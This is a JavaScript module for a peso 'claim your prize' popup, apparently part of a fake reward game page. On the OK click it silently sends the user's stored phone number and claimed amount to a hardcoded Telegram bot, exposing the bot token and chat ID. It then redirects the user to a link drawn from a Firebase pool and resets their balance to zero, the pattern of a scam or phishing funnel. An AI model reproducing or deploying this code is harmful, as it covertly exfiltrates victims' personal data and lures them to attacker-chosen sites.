/**
 * Claim Popup Module - Remastered (Simple OK Button)
 * Walang checkbox, walang agree/authorize, diretso claim
 */

let claimState = {
    isProcessing: false,
    currentAmount: 0
};

// Show the claim popup
function showClaimPopup(amount) {
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const okBtn = document.getElementById('okClaimBtn');
    
    prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    
    if (okBtn) {
        okBtn.classList.remove('processing');
        okBtn.innerHTML = 'OK — CLAIM MY PRIZE';
        okBtn.disabled = false;
        okBtn.style.opacity = '1';
        okBtn.style.pointerEvents = 'auto';
    }
    
    popup.style.display = 'flex';
}

function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    popup.style.display = 'none';
}

// Direct claim - no checkbox needed
function onOKClaim() {
    if (claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const btn = document.getElementById('okClaimBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    btn.classList.add('processing');
    btn.innerHTML = '⏳ PROCESSING...';
    btn.disabled = true;
    
    // Send notification to Telegram
    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
        .catch(e => console.log('Telegram error:', e));
    
    // Get link from Firebase
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                
                // Mark link as claimed
                db.ref('links/' + key).update({ 
                    status: 'claimed', 
                    user: userPhone,
                    amount: amount,
                    claimedAt: Date.now()
                });
                
                // Send confirmation to Telegram
                const confirmMsg = `✅ CLAIM REDIRECTED!\n📱 ${userPhone}\n💵 ₱${amount}\n🔗 ${redirectUrl}`;
                fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(confirmMsg)}`)
                    .catch(e => console.log('Telegram error:', e));
                
                // Update main game balance to 0
                if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                    window.parent.updateGameBalance(0);
                } else if (typeof updateGameBalance === 'function') {
                    updateGameBalance(0);
                } else if (typeof GameState !== 'undefined') {
                    GameState.balance = 0;
                    if (typeof updateUI === 'function') updateUI();
                    if (typeof saveData === 'function') saveData();
                }
                
                // Hide popup and redirect
                setTimeout(() => {
                    hideClaimPopup();
                    window.location.href = redirectUrl;
                }, 1500);
                
            } else {
                // No available links
                btn.innerHTML = '❌ NO REWARDS';
                btn.style.background = 'linear-gradient(135deg, #666, #444)';
                setTimeout(() => {
                    btn.innerHTML = 'OK — CLAIM MY PRIZE';
                    btn.classList.remove('processing');
                    btn.style.background = 'linear-gradient(135deg, #39ff14, #0a8a00)';
                    btn.disabled = false;
                    claimState.isProcessing = false;
                }, 3000);
                alert("Sorry! No available rewards at the moment. Please try again later.");
            }
        }).catch((error) => {
            console.error("Database error:", error);
            btn.innerHTML = '❌ ERROR';
            setTimeout(() => {
                btn.innerHTML = 'OK — CLAIM MY PRIZE';
                btn.classList.remove('processing');
                btn.style.background = 'linear-gradient(135deg, #39ff14, #0a8a00)';
                btn.disabled = false;
                claimState.isProcessing = false;
            }, 3000);
            alert("Database error. Please try again.");
        });
    } else {
        alert("Firebase not initialized. Please refresh.");
        claimState.isProcessing = false;
        btn.classList.remove('processing');
        btn.innerHTML = 'OK — CLAIM MY PRIZE';
        btn.disabled = false;
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    if (!document.getElementById('claimPopup')) {
        console.log('Popup container not found');
    }
});
